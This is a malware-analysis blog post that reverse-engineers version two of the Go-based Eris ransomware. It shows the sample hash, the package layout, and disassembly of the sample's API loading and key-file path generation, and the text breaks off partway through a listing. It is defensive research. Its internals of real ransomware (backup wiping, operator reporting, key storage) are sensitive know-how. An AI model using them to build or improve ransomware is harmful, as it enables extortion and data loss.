<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <meta name="author" content="Joakim Kennedy">
    <meta name="description" content="A place I share my thoughts and play with stuff">
    <meta name="keywords" content="blog,developer,hacks,security,malware">

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Go Under the Hood: Eris Ransomware"/>
<meta name="twitter:description" content="Eris ransomware was first discovered in May 2019. In July it was reported by Bleeping Compute that the malware was being distributed by the RIG exploit kit.r"/>

    <meta property="og:title" content="Go Under the Hood: Eris Ransomware" />
<meta property="og:description" content="Eris ransomware was first discovered in May 2019. In July it was reported by Bleeping Compute that the malware was being distributed by the RIG exploit kit.r" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/go-under-the-hood-eris/" />
<meta property="article:published_time" content="2019-10-06T21:01:26+01:00" />
<meta property="article:modified_time" content="2019-10-06T21:01:26+01:00" />


    
      <base href="../../posts/go-under-the-hood-eris/">
    
    <title>
  Go Under the Hood: Eris Ransomware · Playhouse
</title>

    
      <link rel="canonical" href="../../posts/go-under-the-hood-eris/">
    

    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />

    
      
      
      <link rel="stylesheet" href="../../css/coder.min.28d751104f30c16da1aa1bb04015cbe662cacfe0d1b01af4f2240ad58580069c.css" integrity="sha256-KNdREE8wwW2hqhuwQBXL5mLKz&#43;DRsBr08iQK1YWABpw=" crossorigin="anonymous" media="screen" />
    

    

    

    

    
    
    <link rel="icon" type="image/png" href="../../images/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="../../images/favicon-16x16.png" sizes="16x16">

    <meta name="generator" content="Hugo 0.80.0" />
  </head>

  <body class=" ">
    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="../../">
      Playhouse
    </a>
    <input type="checkbox" id="menu-toggle" />
    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
    <ul class="navigation-list">
      
        
          <li class="navigation-item">
            <a class="navigation-link" href="../../posts/">Blog</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://go-re.tk">Go Reverse Engineering Tool Kit</a>
          </li>
        
          <li class="navigation-item">
            <a class="navigation-link" href="https://ipfs.io/ipns/gomalware.lekstu.ga">Go Malware</a>
          </li>
        
      
      
    </ul>
  </section>
</nav>


      <div class="content">
        
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">Go Under the Hood: Eris Ransomware</h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fas fa-calendar"></i>
              <time datetime='2019-10-06T21:01:26&#43;01:00'>
                October 6, 2019
              </time>
            </span>
            <span class="reading-time">
              <i class="fas fa-clock"></i>
              24 minutes read
            </span>
          </div>
          
          <div class="tags">
  <i class="fas fa-tag"></i>
    <a href="../../tags/go/">go</a>
      <span class="separator">•</span>
    <a href="../../tags/malware/">malware</a>
      <span class="separator">•</span>
    <a href="../../tags/ransomware/">ransomware</a>
      <span class="separator">•</span>
    <a href="../../tags/go_under_the_hood/">go_under_the_hood</a></div>

        </div>
      </header>

      <div>
        <p>Eris ransomware was first discovered in May 2019. In July it was reported by
<a href="https://www.bleepingcomputer.com/news/security/rig-exploit-kit-pushing-eris-ransomware-in-drive-by-downloads/">Bleeping
Computer</a>
that the malware was being distributed by the RIG exploit kit.</p>
<p>Here is a set of analysis notes for version two of the family.  The sample used
for the analysis has the hash of
<code>99d19dd82330a1c437a64e7ca9896ad9d914de10c4f7aa2222b1a5bc4750f692</code></p>
<h2 id="malware-overview">Malware overview</h2>
<p>Version two of the Eris ransomware are made up of six packages.</p>
<ul>
<li>Sync package used to collect victim information and send it to the operator.</li>
<li>Main package</li>
<li>Utils</li>
<li>Cryptography</li>
<li>Anti package used for wiping 3rd party backup files</li>
<li>Walk package used to walk the file system</li>
</ul>
<p>A source code layout created by <code>redress</code> is shown below.</p>
<pre><code>Package Eris/Sync: .
File: .	
	init Lines: 1 to 11 (10)	
	GetOS Lines: 5 to 17 (12)	
	GetSpace Lines: 11 to 12 (1)	
	GetID Lines: 11 to 25 (14)	
	GetGeo Lines: 12 to 22 (10)	
	GetSyncInfo Lines: 17 to 85 (68)	
	machineID Lines: 25 to 27 (2)	
	GetSyns Lines: 85 to 451 (366)	
Package main: .
File: .	
	init Lines: 1 to 1 (0)	
	Init Lines: 30 to 46 (16)	
	main Lines: 46 to 236 (190)	
	mainfunc1 Lines: 165 to 166 (1)	
	ReadFileA Lines: 236 to 246 (10)	
	LineCountA Lines: 246 to 250 (4)	
Package Eris/Utils: .
File: .	
	init Lines: 1 to 1 (0)	
	RandStringBytes Lines: 18 to 35 (17)	
	Kill Lines: 35 to 64 (29)	
	initializers Lines: 43 to 44 (1)	
	Execute Lines: 64 to 83 (19)	
	(*WindowsProcess)Pid Lines: 78 to 82 (4)	
	(*WindowsProcess)PPid Lines: 82 to 86 (4)	
	GetDrive Lines: 83 to 107 (24)	
	(*WindowsProcess)Executable Lines: 86 to 90 (4)	
	newWindowsProcess Lines: 90 to 122 (32)	
	Contains Lines: 107 to 119 (12)	
	Exists Lines: 119 to 130 (11)	
	processes Lines: 122 to 127 (5)	
	Wrap Lines: 130 to 139 (9)	
Package Eris/Cryptography: .
File: .	
	init Lines: 1 to 1 (0)	
	RC4Encrypt Lines: 5 to 15 (10)	
	RSAGenerateKey Lines: 15 to 43 (28)	
	Lock Lines: 23 to 57 (34)	
	RSAEncrypt Lines: 43 to 46 (3)	
Package Eris/Anti: .
File: .	
	init Lines: 1 to 10 (9)	
	WipeBackup Lines: 11 to 15 (4)	
Package Eris/Walk: .
File: .	
	init Lines: 1 to 116 (115)	
	Check Lines: 10 to 18 (8)	
	WalkDirectores Lines: 18 to 130 (112)	
	WalkComputer Lines: 130 to 133 (3)	
	WalkComputerfunc1 Lines: 133 to 142 (9)	
	WalkComputerfunc2 Lines: 142 to 143 (1)	
</code></pre><h2 id="technical-breakdown">Technical breakdown</h2>
<h3 id="loading-import-functions">Loading import functions</h3>
<p>The malware loads some additional imports in its init function. These imports
are later used to list all the running processes.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">fcn</span>) <span style="color:#66d9ef">sym.Eris_Utils_init.ializers</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053df90</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> <span style="color:#66d9ef">fs</span>:[<span style="color:#ae81ff">0x14</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053df97</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">ecx</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053df9d</span>  <span style="color:#66d9ef">cmp</span> <span style="color:#66d9ef">esp</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">ecx</span> <span style="color:#960050;background-color:#1e0010">+</span> <span style="color:#ae81ff">8</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dfa0</span>  <span style="color:#66d9ef">jbe</span> <span style="color:#ae81ff">0x53e101</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dfa6</span>  <span style="color:#66d9ef">sub</span> <span style="color:#66d9ef">esp</span>, <span style="color:#ae81ff">0x10</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dfa9</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">str_kernel32.dll</span> <span style="color:#75715e">; &#34;kernel32.dll&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0053dfaf</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dfb2</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">0xc</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dfba</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.syscall.NewLazyDLL</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dfbf</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#ae81ff">0x88be50</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dfc5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dfc9</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dfcb</span>  <span style="color:#66d9ef">jne</span> <span style="color:#ae81ff">0x53e0ef</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dfd1</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">sym.hKernel32.dll</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dfd7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dfda</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#ae81ff">0x675b84</span>] <span style="color:#75715e">; &#34;CloseHandle&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0053dfe0</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dfe4</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">0xb</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dfec</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.syscall___LazyDLL_.NewProc</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dff1</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#ae81ff">0x88be50</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dff7</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dffb</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053dffd</span>  <span style="color:#66d9ef">jne</span> <span style="color:#ae81ff">0x53e0dd</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e003</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">sym.pCloseHandle</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e009</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">sym.hKernel32.dll</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e00f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e012</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#ae81ff">0x67ae16</span>] <span style="color:#75715e">; &#34;CreateToolhelp32Snapshot&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0053e018</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e01c</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">0x18</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e024</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.syscall___LazyDLL_.NewProc</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e029</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#ae81ff">0x88be50</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e02f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e033</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e035</span>  <span style="color:#66d9ef">jne</span> <span style="color:#ae81ff">0x53e0cb</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e03b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">sym.pCreateToolhelp32Snapshot</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e041</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">sym.hKernel32.dll</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e047</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e04a</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#ae81ff">0x6772a1</span>] <span style="color:#75715e">; &#34;Process32FirstW&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0053e050</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e054</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">0xf</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e05c</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.syscall___LazyDLL_.NewProc</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e061</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#ae81ff">0x88be50</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e067</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e06b</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e06d</span>  <span style="color:#66d9ef">jne</span> <span style="color:#ae81ff">0x53e0bc</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e06f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">sym.pProcess32FirstW</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e075</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">sym.hKernel32.dll</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e07b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e07e</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#ae81ff">0x676d3a</span>] <span style="color:#75715e">; &#34;Process32NextW&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x0053e084</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e088</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#ae81ff">0xe</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e090</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">sym.syscall___LazyDLL_.NewProc</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e095</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#ae81ff">0x88be50</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e09b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e09f</span>  <span style="color:#66d9ef">test</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e0a1</span>  <span style="color:#66d9ef">jne</span> <span style="color:#ae81ff">0x53e0ad</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e0a3</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">sym.pProcess32NextW</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e0a9</span>  <span style="color:#66d9ef">add</span> <span style="color:#66d9ef">esp</span>, <span style="color:#ae81ff">0x10</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x0053e0ac</span>  <span style="color:#66d9ef">ret</span>
</code></pre></div><h3 id="encryption-key-generation">Encryption key generation</h3>
<p>The malware uses the following struct to store the keys generated for the
victim.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#66d9ef">type</span> <span style="color:#a6e22e">main</span>.<span style="color:#a6e22e">Session</span> <span style="color:#66d9ef">struct</span> {
    <span style="color:#a6e22e">Extension</span> <span style="color:#66d9ef">string</span>
    <span style="color:#a6e22e">PUBLIC_KEY</span> []<span style="color:#66d9ef">uint8</span>
    <span style="color:#a6e22e">E_PRIVATE_KEY</span> []<span style="color:#66d9ef">uint8</span>
}
</code></pre></div><p>It is also stored encrypted on the disk. The following snippet shows the
generation of file path to the files.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe3ff</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#ae81ff">0x6770d0</span>] <span style="color:#75715e">; &#34;ALLUSERSPROFILE&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005fe405</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe408</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">0xf</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe410</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.os.Getenv</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe415</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe419</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe41d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe420</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe424</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.runtime.convTstring</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe429</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe42d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_198h</span>], <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe438</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_19ch</span>], <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe443</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_1a0h</span>], <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe44e</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_1a4h</span>], <span style="color:#ae81ff">0</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe459</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">ecx</span>, <span style="color:#66d9ef">sym.type.string</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe45f</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_198h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe466</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_19ch</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe46d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_1a0h</span>], <span style="color:#66d9ef">ecx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe474</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#ae81ff">0x6cec98</span>] <span style="color:#75715e">; &#34;00000000.pky&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005fe47a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_1a4h</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe481</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">eax</span>, [<span style="color:#ae81ff">0x6745d6</span>] <span style="color:#75715e">; &#34;%s\%s&#34;
</span><span style="color:#75715e"></span><span style="color:#ae81ff">0x005fe487</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">eax</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe48a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#ae81ff">5</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe492</span>  <span style="color:#66d9ef">lea</span> <span style="color:#66d9ef">edx</span>, [<span style="color:#66d9ef">var_198h</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe499</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_8h</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe49d</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_ch</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe4a5</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_10h</span>], <span style="color:#ae81ff">2</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe4ad</span>  <span style="color:#66d9ef">call</span> <span style="color:#66d9ef">fcn.fmt.Sprintf</span>
</code></pre></div><p>The data is stored in these three files:</p>
<ul>
<li><code>%ALLUSERSPROFILE%\00000000.pky</code></li>
<li><code>%ALLUSERSPROFILE%\00000000.eky</code></li>
<li><code>%ALLUSERSPROFILE%\00000000.ext</code></li>
</ul>
<p>If files already exists, they are used instead of generating a new key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe65a</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">edx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">pky_path_str</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe661</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">esp</span>], <span style="color:#66d9ef">edx</span>
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe664</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">ebx</span>, <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">pky_path_str_len</span>]
<span style="color:#960050;background-color:#1e0010">0</span><span style="color:#a6e22e">x005fe66b</span>  <span style="color:#66d9ef">mov</span> <span style="color:#66d9ef">dword</span> [<span style="color:#66d9ef">var_4h</span>], <span style="color:#66d9ef">ebx</span>
